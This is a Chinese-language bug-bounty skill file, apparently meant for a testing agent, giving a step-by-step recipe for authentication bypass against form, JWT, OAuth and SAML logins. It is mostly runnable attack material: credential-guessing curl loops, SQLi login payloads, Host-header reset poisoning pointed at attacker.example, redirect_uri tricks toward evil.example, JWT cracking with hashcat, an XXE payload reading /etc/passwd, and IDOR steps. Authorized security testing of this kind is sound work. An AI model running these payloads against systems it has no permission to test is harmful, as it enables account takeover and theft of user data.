---
name: bb-authentication-bypass
description: 认证绕过测试配方（form / JWT / OAuth / SAML，含越权）
when_to_use: 目标存在登录、SSO、重置密码或令牌机制
---
# 认证绕过测试

`auth_type ∈ {form, jwt, oauth, saml}`；阶段：侦察 → 基线 → 绕过 → 越权。
预计 240 分钟，**必须人工验证**（自动化只能给出候选）。

## 0. 侦察
```bash
# 抓登录请求：字段名 / cookie / CSRF token / 是否 JWT / 是否重定向到 IdP
curl -sSk -D $RUN/raw/login.hdr -o $RUN/raw/login.body -c $RUN/raw/cookies.txt "$TARGET/login"
grep -iE 'set-cookie|location' $RUN/raw/login.hdr
# 用户名枚举：不存在用户 vs 密码错误的响应差异
for u in admin nobody; do
  curl -sSk -o /dev/null -w "$u -> %{http_code} %{size_download}\n" \
    --data-urlencode "username=$u" --data-urlencode "password=x" "$TARGET/login"
done
# 锁定/限速策略见 optimization/rate-limit-detector.md
```

## 1. form 表单

### 默认口令（少量、慢速，先手工后 hydra）
```bash
for c in admin:admin admin:password admin:123456 root:root test:test; do
  u=${c%%:*}; p=${c#*:}
  code=$(curl -sSk -o /dev/null -w '%{http_code}' -c $RUN/raw/c_$u.txt \
    --data-urlencode "username=$u" --data-urlencode "password=$p" "$TARGET/login")
  echo "$c -> $code"
done
# 批量: tools/hydra.md（-t 4 起，注意锁定策略）
```

### SQLi / 逻辑绕过（`payloads/sqli.md`）
```
admin'--
admin' #
' OR '1'='1'--
' OR 1=1 LIMIT 1--
") OR ("1"="1
```
用 `http/framework.md` 的 intruder 发包，命中判定：登录后页面/新 cookie/302 到后台。
**注意**：部分站点对 `--` 注释后需补空格或换行；报错回显泄漏时按 `recovery/error-patterns.md` 判定。

### 密码重置
```bash
# token 复用：同一重置链接第二次使用是否仍有效
curl -sSk -o /dev/null -w '%{http_code}\n' "$RESET_LINK"; \
curl -sSk -o /dev/null -w '%{http_code}\n' "$RESET_LINK"
# token 可预测：连续请求观察是否时间戳/短随机/邮箱派生
for i in 1 2 3; do curl -sSk -X POST -d "email=victim@x" "$TARGET/forgot" -o /dev/null -D - | grep -i location; done
# Host 头投毒：重置链接域名是否取自 Host
curl -sSk -X POST -H 'Host: attacker.example' -d "email=victim@x" "$TARGET/forgot" -D - -o /dev/null | grep -i location
# 响应/HTML 中直接泄漏 token
grep -oiE 'token=[A-Za-z0-9._-]{8,}' $RUN/raw/forgot.body | head
```

### 会话固定
```
1. 未登录拿 session（S0）→ 登录 → 若仍是 S0 = 固定漏洞（critical/high）
2. cookie 属性: 无 HttpOnly / Secure / SameSite=None 记 medium
```

## 2. JWT（解码与 none/弱密钥见 `api-security/jwt.md`）

| 技术 | 判定 |
|---|---|
| `alg:none` | 服务端接受即 critical |
| RS256 → HS256 混淆 | 用公钥当 HMAC 密钥重签，接受即 critical |
| key confusion / 公钥泄露 | 从 `/jwks.json`、证书、源码取公钥尝试 |
| claim 篡改 | `role/admin/sub/tenant/exp` 改后重签仍通过 |
| `kid` 注入 | `kid=../../dev/null`、SQL/命令注入到密钥查找 |
| `jku`/`x5u` 劫持 | 指向自控 JWKS，服务端是否拉取 |
```bash
command -v jwt_tool >/dev/null && python3 /opt/jwt_tool/jwt_tool.py "$T" -M at   # 全部已知攻击
command -v jwt_tool >/dev/null && python3 /opt/jwt_tool/jwt_tool.py "$T" -X k -pk pub.pem  # RS→HS
# kid/claim 手工改后用 http/framework.md repeater 重放；弱密钥:
hashcat -m 16500 -a 0 "$T" /usr/share/wordlists/rockyou.txt --force
```

## 3. OAuth
```bash
AUTH='https://idp.example/authorize?response_type=code&client_id=CLIENT&redirect_uri=REDIR&scope=openid&state=S'

# redirect_uri 操纵（逐个试，看是否回跳到外部域）
for r in 'https://evil.example/cb' 'https://target.evil.example/cb' \
         'https://target/cb/../evil' 'https://target@evil.example/cb' \
         'https://target:8443/cb' 'https://target/cb?next=https://evil.example'; do
  curl -sSk -o /dev/null -w "$r -> %{http_code} %{redirect_url}\n" \
    "${AUTH/REDIR/$r}" -H 'User-Agent: Mozilla/5.0'
done
# state 缺失/固定 → CSRF 绑定测试（重放不带 state 的授权请求）
# code 重放/跨账号：同一 code 换第二次 token；A 的 code 换 B 的会话
curl -sSk -X POST https://idp.example/token -d "grant_type=authorization_code&code=$CODE&redirect_uri=$REDIR&client_id=CLIENT"
# client_secret 泄漏：JS/APK/仓库/错误回显
grep -rioE 'client_secret["'"'"' :=]+[A-Za-z0-9_-]{8,}' $RUN/artifacts/ $RUN/raw/ 2>/dev/null | head
```

## 4. SAML
```bash
# 解出断言与签名
grep -oE 'SAMLResponse=[^&"]+' $RUN/raw/saml.body | cut -d= -f2 | base64 -d 2>/dev/null | tee $RUN/artifacts/saml.xml
# 关注: XSW(签名包裹: 保留签名节点、复制断言改内容)、XXE(DOCTYPE/ENTITY)、
#       断言重放(同一 Response 二次提交)、签名校验绕过(注释/命名空间/重复 ID)
```
```
XSW 手法（任选）: Signature 留在原断言，篡改另一份断言并放前面/后面；
XXE: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]> 注入 NameID；
重放: Replay 同一 NotOnOrAfter 内的 Response 到第二个会话。
```

## 5. 越权（紧接认证之后）
```
垂直: 普通账号直接访问 /admin、/api/admin/*（拿到 200/功能可用即命中）
水平: 改 id/tenant/uid/订单号，验证返回他人数据（IDOR）
RBAC: 前端隐藏但接口未校验（对比 UI 与 API 行为）
方法: 用低权 cookie 重放高权请求（http/framework.md repeater）；
      参数级见 bugbounty/business-logic.md 的"越权"。
```

## 记账
- 命中即 `add_finding <sev> auth_bypass <title> <url> curl <evidence>`：
  `alg:none 接受/RS→HS 成功/默认口令/SQLi 登录/固定会话` → critical 或 high；
  `state 缺失/弱 cookie 属性/用户名枚举` → medium。
- 每个绕过保留完整请求与响应（`raw/`），未复现的猜测记 info。
- 流程顺序：`reconnaissance → baseline_testing → bypass_testing → privilege_escalation`。
